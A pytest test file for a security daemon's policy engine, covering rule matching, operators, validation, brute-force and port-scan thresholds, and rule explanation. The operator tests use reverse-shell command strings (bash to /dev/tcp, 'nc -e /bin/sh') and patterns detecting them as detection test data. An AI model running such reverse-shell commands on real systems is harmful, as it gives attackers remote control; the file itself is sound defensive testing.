import pytest

from secagent.daemon.policy_engine import Policy, PolicyEngine, PolicyError, parse_rule
from secagent.events import Event

SPEC_RULE = """
rules:
  - id: suspicious-shell-from-webserver
    match:
      event_type: process_exec
      parent_name: ["nginx", "apache2"]
      child_name: ["sh", "bash", "nc"]
    severity: high
    action: alert
    message: "{parent_name} spawned {child_name} (pid {pid})"
"""


def exec_event(**data):
    base = {"pid": 4242, "ppid": 1, "parent_name": "nginx", "child_name": "bash"}
    base.update(data)
    return Event(type="process_exec", source="test", data=base)


def engine(yaml_text: str) -> PolicyEngine:
    return PolicyEngine(Policy.from_yaml(yaml_text))


# ----------------------------------------------------------------- basic matching

def test_spec_example_rule_matches():
    alerts = engine(SPEC_RULE).evaluate(exec_event())
    assert len(alerts) == 1
    a = alerts[0]
    assert a.rule_id == "suspicious-shell-from-webserver"
    assert a.severity == "high"
    assert a.message == "nginx spawned bash (pid 4242)"


def test_no_match_when_parent_differs():
    assert engine(SPEC_RULE).evaluate(exec_event(parent_name="sshd")) == []


def test_no_match_on_wrong_event_type():
    ev = Event(type="file_change", source="test", data={"parent_name": "nginx", "child_name": "bash"})
    assert engine(SPEC_RULE).evaluate(ev) == []


def test_missing_field_never_matches():
    ev = Event(type="process_exec", source="test", data={"parent_name": "nginx"})
    assert engine(SPEC_RULE).evaluate(ev) == []


def test_missing_field_does_not_satisfy_negative_operator():
    e = engine("""
rules:
  - id: r
    match: {event_type: process_exec, child_name: {not_in: [sudo]}}
    severity: low
""")
    assert e.evaluate(Event("process_exec", "t", {})) == []
    assert len(e.evaluate(Event("process_exec", "t", {"child_name": "bash"}))) == 1


def test_exists_operator():
    e = engine("""
rules:
  - id: has-ip
    match: {src_ip: {exists: true}}
    severity: low
  - id: no-ip
    match: {src_ip: {exists: false}}
    severity: low
""")
    assert [a.rule_id for a in e.evaluate(Event("x", "t", {"src_ip": "1.2.3.4"}))] == ["has-ip"]
    assert [a.rule_id for a in e.evaluate(Event("x", "t", {}))] == ["no-ip"]


def test_multiple_matching_rules_all_fire():
    e = engine("""
rules:
  - id: a
    match: {event_type: process_exec, child_name: bash}
    severity: low
  - id: b
    match: {event_type: process_exec, parent_name: nginx}
    severity: high
  - id: c
    match: {event_type: process_exec, parent_name: apache2}
    severity: high
""")
    assert sorted(a.rule_id for a in e.evaluate(exec_event())) == ["a", "b"]


def test_disabled_rule_does_not_fire():
    e = engine(SPEC_RULE.replace("action: alert", "action: alert\n    enabled: false"))
    assert e.evaluate(exec_event()) == []


def test_empty_policy_matches_nothing():
    assert PolicyEngine(Policy.from_dict({})).evaluate(exec_event()) == []


# ----------------------------------------------------------------- operators

@pytest.mark.parametrize("spec,value,expected", [
    ({"startswith": ["/tmp/", "/dev/shm/"]}, "/tmp/x", True),
    ({"startswith": ["/tmp/", "/dev/shm/"]}, "/usr/bin/x", False),
    ({"endswith": ".sh"}, "/a/b.sh", True),
    ({"glob": "/etc/sudoers*"}, "/etc/sudoers.d/90-cloud", True),
    ({"glob": "/etc/sudoers*"}, "/etc/passwd", False),
    ({"regex": r"/dev/tcp/\d+"}, "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", True),
    ({"contains": "nc -e"}, "nc -e /bin/sh 1.2.3.4 9", True),
    ({"gt": 1024}, 4444, True),
    ({"gt": 1024}, "80", False),
    ({"gte": 22, "lte": 22}, 22, True),
    ({"lt": 10}, "not-a-number", False),
    ({"cidr": ["10.0.0.0/8", "192.168.0.0/16"]}, "10.1.2.3", True),
    ({"cidr": ["10.0.0.0/8"]}, "8.8.8.8", False),
    ({"not_cidr": ["127.0.0.0/8"]}, "8.8.8.8", True),
    ({"cidr": ["10.0.0.0/8"]}, "garbage", False),
    ({"ne": "root"}, "alice", True),
    ({"not_glob": "/usr/*"}, "/tmp/x", True),
])
def test_operators(spec, value, expected):
    rule = parse_rule({"id": "r", "match": {"f": spec}, "severity": "low"})
    assert rule.matches(Event("x", "t", {"f": value})) is expected


def test_numeric_equality_across_types():
    rule = parse_rule({"id": "r", "match": {"dst_port": [4444, 1337]}, "severity": "low"})
    assert rule.matches(Event("x", "t", {"dst_port": "4444"}))
    assert rule.matches(Event("x", "t", {"dst_port": 1337}))
    assert not rule.matches(Event("x", "t", {"dst_port": 443}))


def test_list_valued_event_field_any_semantics():
    rule = parse_rule({"id": "r", "match": {"ancestors": ["nginx", "apache2"]}, "severity": "low"})
    assert rule.matches(Event("x", "t", {"ancestors": ["bash", "php-fpm", "nginx", "systemd"]}))
    assert not rule.matches(Event("x", "t", {"ancestors": ["bash", "sshd", "systemd"]}))


def test_list_valued_event_field_negative_requires_all():
    rule = parse_rule({"id": "r", "match": {"ancestors": {"not_in": ["sshd"]}}, "severity": "low"})
    assert rule.matches(Event("x", "t", {"ancestors": ["bash", "systemd"]}))
    assert not rule.matches(Event("x", "t", {"ancestors": ["bash", "sshd", "systemd"]}))


def test_dotted_path_lookup():
    rule = parse_rule({"id": "r", "match": {"proc.name": "bash"}, "severity": "low"})
    assert rule.matches(Event("x", "t", {"proc": {"name": "bash"}}))
    assert not rule.matches(Event("x", "t", {"proc": "bash"}))


def test_message_with_unknown_placeholder_is_safe():
    e = engine("""
rules:
  - id: r
    match: {event_type: process_exec}
    severity: low
    message: "pid={pid} nope={does_not_exist} bad={"
""")
    msg = e.evaluate(exec_event())[0].message
    assert "pid=" in msg  # template errors fall back gracefully instead of raising


def test_message_placeholder_missing_field_renders_question_mark():
    e = engine("""
rules:
  - id: r
    match: {event_type: process_exec}
    severity: low
    message: "user={user}"
""")
    assert e.evaluate(exec_event())[0].message == "user=?"


# ----------------------------------------------------------------- validation

@pytest.mark.parametrize("doc,needle", [
    ({"rules": [{"match": {"a": 1}}]}, "missing a string 'id'"),
    ({"rules": [{"id": "x", "match": {"a": 1}, "severity": "urgent"}]}, "severity"),
    ({"rules": [{"id": "x", "match": {"a": 1}, "action": "nuke"}]}, "action"),
    ({"rules": [{"id": "x", "match": {}}]}, "non-empty"),
    ({"rules": [{"id": "x"}]}, "non-empty"),
    ({"rules": [{"id": "x", "match": {"a": {"bogus": 1}}}]}, "unknown operator"),
    ({"rules": [{"id": "x", "match": {"a": {"regex": "("}}}]}, "bad regex"),
    ({"rules": [{"id": "x", "match": {"a": {"gt": "lots"}}}]}, "needs a number"),
    ({"rules": [{"id": "x", "match": {"a": 1}}, {"id": "x", "match": {"b": 1}}]}, "duplicate"),
    ({"rules": [{"id": "x", "match": {"a": 1}, "threshold": {"count": 0, "window": 5}}]}, "threshold"),
    ({"rules": [{"id": "x", "match": {"a": 1}, "threshold": {"window": 5}}]}, "threshold"),
    ({"rules": "nope"}, "must be a list"),
])
def test_invalid_policies_are_rejected(doc, needle):
    with pytest.raises(PolicyError, match=needle):
        Policy.from_dict(doc)


def test_invalid_yaml_file(tmp_path):
    p = tmp_path / "bad.yaml"
    p.write_text("rules: [\n  - id: x\n   bad indent")
    with pytest.raises(PolicyError, match="invalid YAML"):
        Policy.from_file(p)


# ----------------------------------------------------------------- thresholds

BRUTE = """
rules:
  - id: brute
    match: {event_type: auth_failure}
    severity: high
    message: "{count} failures from {src_ip} in {window}s"
    threshold: {count: 5, window: 60, group_by: [src_ip], cooldown: 300}
"""


def fail(ip, ts):
    return Event("auth_failure", "t", {"src_ip": ip, "user": "root"}, timestamp=ts)


def test_threshold_fires_exactly_at_count_not_before():
    e = engine(BRUTE)
    for i in range(4):
        assert e.evaluate(fail("1.1.1.1", 1000 + i)) == [], f"fired early at hit {i + 1}"
    alerts = e.evaluate(fail("1.1.1.1", 1004))
    assert len(alerts) == 1
    assert alerts[0].message == "5 failures from 1.1.1.1 in 60.0s"
    assert alerts[0].event.data["_threshold"]["count"] == 5


def test_threshold_window_expiry():
    e = engine(BRUTE)
    for i in range(4):
        e.evaluate(fail("1.1.1.1", 1000 + i))
    # 5th failure arrives after the first ones aged out of the 60 s window
    assert e.evaluate(fail("1.1.1.1", 1000 + 61)) == []


def test_threshold_groups_are_independent():
    e = engine(BRUTE)
    for i in range(4):
        e.evaluate(fail("1.1.1.1", 1000 + i))
        e.evaluate(fail("2.2.2.2", 1000 + i))
    assert [a.event.data["src_ip"] for a in e.evaluate(fail("2.2.2.2", 1010))] == ["2.2.2.2"]


def test_threshold_cooldown_suppresses_repeat_alerts():
    e = engine(BRUTE)
    for i in range(5):
        e.evaluate(fail("1.1.1.1", 1000 + i))
    for i in range(20):  # attacker keeps going inside the cooldown
        assert e.evaluate(fail("1.1.1.1", 1010 + i)) == []
    # after cooldown, a fresh burst alerts again
    out = [e.evaluate(fail("1.1.1.1", 1400 + i)) for i in range(5)]
    assert sum(len(x) for x in out) == 1


def test_threshold_distinct_counts_unique_values():
    e = engine("""
rules:
  - id: scan
    match: {event_type: net_connect}
    severity: high
    threshold: {count: 3, window: 10, group_by: [pid], distinct: dst_port}
""")
    def conn(port, ts):
        return Event("net_connect", "t", {"pid": 7, "dst_port": port}, timestamp=ts)
    # repeated connections to the same port don't count as distinct
    for i in range(10):
        assert e.evaluate(conn(80, 100 + i * 0.1)) == []
    assert e.evaluate(conn(81, 101.5)) == []
    alerts = e.evaluate(conn(82, 101.6))
    assert len(alerts) == 1
    assert alerts[0].event.data["_threshold"]["distinct_values"] == ["80", "81", "82"]


def test_threshold_context_does_not_leak_into_shared_event():
    e = engine(BRUTE)
    ev = None
    for i in range(5):
        ev = fail("1.1.1.1", 1000 + i)
        e.evaluate(ev)
    assert "_threshold" not in ev.data


def test_threshold_group_memory_is_bounded():
    e = engine(BRUTE)
    e.MAX_GROUPS_PER_RULE = 100
    for i in range(500):
        e.evaluate(fail(f"10.0.{i // 256}.{i % 256}", 1000))
    assert len(e._state["brute"]) <= 100


def test_reload_swaps_rules_and_drops_stale_state():
    e = engine(BRUTE)
    e.evaluate(fail("1.1.1.1", 1000))
    e.reload(Policy.from_yaml(SPEC_RULE))
    assert [r.id for r in e.rules] == ["suspicious-shell-from-webserver"]
    assert "brute" not in e._state


# ----------------------------------------------------------------- explain / dry-run

def test_explain_reports_each_condition():
    e = engine(SPEC_RULE)
    res = e.explain("suspicious-shell-from-webserver", exec_event(child_name="python3"))
    assert res["matched"] is False
    by_cond = {c["condition"].split()[0]: c for c in res["conditions"]}
    assert by_cond["parent_name"]["passed"] is True
    assert by_cond["child_name"]["passed"] is False
    assert by_cond["child_name"]["actual"] == "python3"


def test_explain_unknown_rule():
    with pytest.raises(KeyError):
        engine(SPEC_RULE).explain("nope", exec_event())


def test_event_from_flat_dict():
    ev = Event.from_dict({"event_type": "process_exec", "parent_name": "nginx", "child_name": "sh"})
    assert ev.type == "process_exec"
    assert ev.data == {"parent_name": "nginx", "child_name": "sh"}
